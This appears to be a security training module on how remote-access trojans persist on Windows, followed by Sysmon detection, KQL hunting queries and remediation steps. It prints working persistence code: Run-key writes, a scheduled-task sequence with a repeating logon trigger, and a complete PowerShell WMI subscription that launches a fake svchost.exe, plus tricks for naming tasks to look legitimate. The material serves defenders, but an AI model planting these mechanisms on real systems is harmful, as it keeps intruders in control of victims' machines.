## Module 7: RAT Persistence (Continued)

**Registry Run Key Persistence**
`R**********xA(HKCU, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);`
`R**********xA(hKey, "Updater", 0, REG_SZ, (BYTE*)szPath, lstrlen(szPath)+1);`
`RegCloseKey(hKey);`

The above code writes the malware payload path to the HKCU Run key under the value name "Updater", ensuring execution at user login. Variants also target:

| Registry Location | Scope | Privilege Required |
|---|---|---|
| `HKLM\...\Run` | All users | Administrator |
| `HKCU\...\RunOnce` | Single execution | User |
| `HKLM\...\RunOnce` | Single, all users | Administrator |
| `HKCU\...\Policies\Explorer\Run` | Bypasses MSConfig | User |
| `HKLM\...\Winlogon\Shell` | Replaces Explorer.exe | Administrator |
| `HKLM\...\Winlogon\Userinit` | Executes at logon | Administrator |

**ITaskService COM Scheduled Task Persistence**

RATs leverage the Task Scheduler COM interface (`ITaskService`) to register persistent scheduled tasks. The typical call sequence:

```
CoInitializeEx(NULL, COINIT_MULTITHREADED);
CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                 IID_ITaskService, (void**)&pService);
pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);

ITaskDefinition *pTask = NULL;
pService->NewTask(0, &pTask);
pTask->get_Triggers(&pTriggerCollection);
pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pLogonTrigger);
// Set repetition interval: every 5–30 minutes
pLogonTrigger->put_Repetition((IRepetitionPattern*)pRepetition);
pRepetition->put_Interval(L"PT15M");
```

**Common trigger configurations observed in RAT samples:**

- **TASK_TRIGGER_LOGON** — Fires at user logon; commonly paired with repetition.
- **TASK_TRIGGER_BOOT** — Executes at system startup.
- **TASK_TRIGGER_IDLE** — Triggers after idle timeout; lower detection profile.
- **TASK_TRIGGER_TIME** — Daily/weekly scheduled with hidden task flags.

**Task obfuscation techniques:**
- Task names mimic legitimate Windows tasks (e.g., `"WindowsUpdateTask"`, `"OneDriveStandaloneUpdater"`, `"GoogleUpdateTaskMachine"`).
- XML task definitions stored in `%SystemRoot%\System32\Tasks\` with manipulated `Hidden` and `DisallowStartIfOnBatteries` attributes.
- Tasks set with `TASK_CREATE_HIDDEN` flag during `IRegisteredTask::put_Hidden(VARIANT_TRUE)`.

**WMI EventFilter Persistence**

ActiveScriptEventConsumer or CommandLineEventConsumer bound to `__EventFilter` provides fileless persistence that survives reboots without touching disk artifacts.

**Binding structure in WMI repository:**

```
Filter: __EventFilter
  Name: "RATSystemMonitor"
  QueryLanguage: "WQL"
  Query: "SELECT * FROM __InstanceModificationEvent WITHIN 60
          WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

Consumers (commonly used):
  - ActiveScriptEventConsumer → embedded VBScript/JScript
  - CommandLineEventConsumer → executes arbitrary command

Binding: __FilterToConsumerBinding
  Filter → Consumer
```

**WMI persistence installation sequence (PowerShell/COM):**

```powershell
$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
  -Arguments @{Name="ScvHost"; EventNameSpace="root\cimv2";
  QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent
  WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

$consumer = Set-WmiInstance -Namespace "root\subscription" `
  -Class CommandLineEventConsumer `
  -Arguments @{Name="ScvHost"; CommandLineTemplate="$env:APPDATA\svchost.exe"}

Set-WmiInstance -Namespace "root\subscription" `
  -Class __FilterToConsumerBinding `
  -Arguments @{Filter=$filter; Consumer=$consumer}
```

**Key detection challenge:** No on-disk persistence artifacts; the entire mechanism resides in `%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`.

## Detection

### 1. Registry-Based Detection

| Indicator | Sysmon Event ID | Query |
|---|---|---|
| Run key modifications | Event 13 (RegistryEvent: Value Set) | `TargetObject contains "CurrentVersion\Run"` |
| Winlogon shell/userinit tampering | Event 13 | `TargetObject contains "Winlogon" AND (Details contains ".exe" OR Details contains ".dll")` |
| AppInit_DLLs, AppCertDlls | Event 13 | `TargetObject contains "AppInit_DLLs" OR "AppCertDlls"` |
| Image File Execution Options (IFEO) debugger hijack | Event 13 | `TargetObject contains "Image File Execution Options" AND TargetObject contains "Debugger"` |

### 2. Scheduled Task Detection

- **Sysmon Event ID 1 + 11**: Cross-reference `services.exe` spawning with file creation in `C:\Windows\System32\Tasks\`.
- **Windows Security Event ID 4698**: Scheduled task creation.
- **Event ID 4702**: Scheduled task updated.
- **Command-line auditing**: `schtasks.exe /create` with suspicious binary paths.

**Hunting query (KQL / Microsoft 365 Defender):**

```
DeviceProcessEvents
| where ProcessCommandLine has_any ("schtasks", "Register-ScheduledTask",
           "New-ScheduledTask", "ITaskService")
| where ProcessCommandLine contains "AppData" or
        ProcessCommandLine contains "Temp" or
        ProcessCommandLine contains "Public"
```

### 3. WMI Persistence Detection

- **Sysmon Event ID 19**: WmiEvent (WmiEventFilter activity).
- **Sysmon Event ID 20**: WmiEvent (WmiEventConsumer activity).
- **Sysmon Event ID 21**: WmiEvent (WmiEventConsumerToFilter activity).

**Volatility/forensic analysis:**
Parse `OBJECTS.DATA` to enumerate `__EventFilter`, `__EventConsumer`, and `__FilterToConsumerBinding` instances.

**Live detection (PowerShell):**

```powershell
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter
Get-WmiObject -Namespace "root\subscription" -Class __EventConsumer
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding
```

### 4. Additional Persistence Vectors Requiring Monitoring

| Mechanism | Detection |
|---|---|
| Startup folder shortcuts (`.lnk`) | File creation in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` and `%ProgramData%\...\Startup\` |
| Service installation (`CreateServiceA`) | Event ID 7045 (new service), Sysmon Event ID 13 for `HKLM\SYSTEM\CurrentControlSet\Services` |
| DLL Search Order Hijacking | Sysmon Event ID 7 (image load) monitoring for DLLs loaded from writable directories preceding system directories |
| COM Hijacking (`TreatAs`, `LocalServer32`) | Registry monitoring on `HKCR\CLSID\{*}\InprocServer32` and `LocalServer32` key modifications |
| BootExecute (`Session Manager`) | `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute` key |
| Accessibility shortcuts (sethc.exe, utilman.exe, etc.) | Image debugger registry or binary replacement in `%SystemRoot%\System32\` |
| Office Add-ins / VBA template persistence | File creation in `%APPDATA%\Microsoft\Templates\` and registry entries under `HKLM\SOFTWARE\Microsoft\Office` |
| Netsh Helper DLL | Registry monitoring on `HKLM\SOFTWARE\Microsoft\NetSh` |

### 6. Indicators of Compromise (IOC) Summary Table

| Artifact Type | Query / Pattern | Confidence |
|---|---|---|

| Service binary path containing user-writable directory | `sc query state= all \| findstr /i "appdata\|temp\|public"` | High |

### 7. Mitigation & Remediation

1. **Remove offending registry entry**: `reg delete` the Run/RunOnce/Shell value.
2. **Unregister scheduled task**: `schtasks /delete /tn "TaskName" /f` or via `ITaskService::GetFolder` → `DeleteTask`.
3. **Remove WMI subscription**: `Get-WmiObject -Namespace root\subscription` to identify and `Remove-WmiObject` on filter, consumer, and binding.
4. **Isolate affected system**: Disable network adapter; collect disk and memory forensics prior to remediation.
5. **Rotate credentials**: RATs frequently deploy credential dumpers prior to persistence installation.
6. **Apply least privilege**: Restrict `SeBackupPrivilege`, `SeDebugPrivilege`, and `SeTcbPrivilege` from non-admin accounts. WMI subscriptions require local Administrator.
